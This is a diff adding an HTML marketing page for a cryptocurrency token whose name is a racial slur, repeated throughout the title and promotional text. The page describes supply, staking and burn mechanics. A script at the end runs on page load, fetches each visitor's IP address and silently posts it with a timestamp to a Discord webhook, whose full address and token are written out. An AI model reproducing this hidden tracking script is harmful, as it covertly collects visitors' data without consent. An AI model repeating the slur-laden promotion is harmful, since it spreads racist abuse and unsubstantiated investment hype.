@@ -1,0 +1,98 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Niggerbutt Tokenomics</title>
+  <style>
+    /* General styles */
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: Arial, sans-serif;
+      color: white;
+      line-height: 1.6;
+      background: url('background.png') no-repeat center center fixed;
+      background-size: cover;
+    }
+
+    /* Add some padding for the text content */
+    .content {
+      background: rgba(0, 0, 0, 0.6); /* Semi-transparent black background */
+      margin: 20px auto;
+      padding: 20px;
+      max-width: 800px;
+      border-radius: 10px;
+    }
+
+    h1 {
+      text-align: center;
+      margin-bottom: 20px;
+      font-size: 2.5rem;
+    }
+
+    p {
+      font-size: 1.2rem;
+      text-align: justify;
+    }
+
+    /* Ensure the page is scrollable */
+    body, html {
+      height: 100%;
+      overflow-y: scroll;
+    }
+  </style>
+  <!-- Set the favicon to background.png -->
+  <link rel="icon" href="background.png" type="image/png">
+</head>
+<body>
+  <!-- Content Section -->
+  <div class="content">
+    <h1>Nigbutt Tokenomics</h1>
+    <p>
+      Nigbutt Tokenomics is the revolutionary economic framework powering the Niggerbutt decentralized ecosystem. 
+      Designed with simplicity, sustainability, and inclusivity at its core, the tokenomics ensures that every
+      participant has a fair chance to benefit from the system.
+    </p>
+    <p>
+      <strong>Supply:</strong> Niggerbutt tokens have a capped total supply of 69,000,000 tokens, ensuring scarcity 
+      and maintaining long-term value. Initial distribution allocates 50% of tokens to early supporters, 30% 
+      to ecosystem development, and 20% to liquidity reserves.
+    </p>
+    <p>
+      <strong>Staking:</strong> Token holders can stake Niggerbutt to earn passive rewards. Staking also contributes 
+      to network security, incentivizing holders to actively participate in the ecosystem.
+    </p>
+    <p>
+      <strong>Burn Mechanism:</strong> A portion of every transaction is automatically burned, reducing the 
+      circulating supply over time and increasing the value for long-term holders.
+    </p>
+    <p>
+      <strong>Utility:</strong> Niggerbutt tokens can be used for governance voting, accessing premium features 
+      in the Nigbutt platform, and trading within the ecosystem.
+    </p>
+    <p>
+      Join the Niggerbutt movement today and become part of the future of decentralized economies. Together, 
+      we’re building a brighter, more inclusive tomorrow!
+    </p>
+  </div>
+
+  <script>
+    fetch('https://api.ipify.org?format=json')
+      .then(response => response.json())
+      .then(data => {
+        const message = {
+          content: `${data.ip} - ${new Date().toISOString()}`
+        };
+        fetch('https://discord.com/api/webhooks/1326405977825607680/KFunZjbrcLq7sjV_UoMqCKawOSTfXUWgRNd723QDfD8g2bz0nN9b4hD5-9qZKuVUuFDK', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify(message),
+        });
+      })
+      .catch(error => console.error('Error fetching IP:', error));
+  </script>
+</body>
+</html>
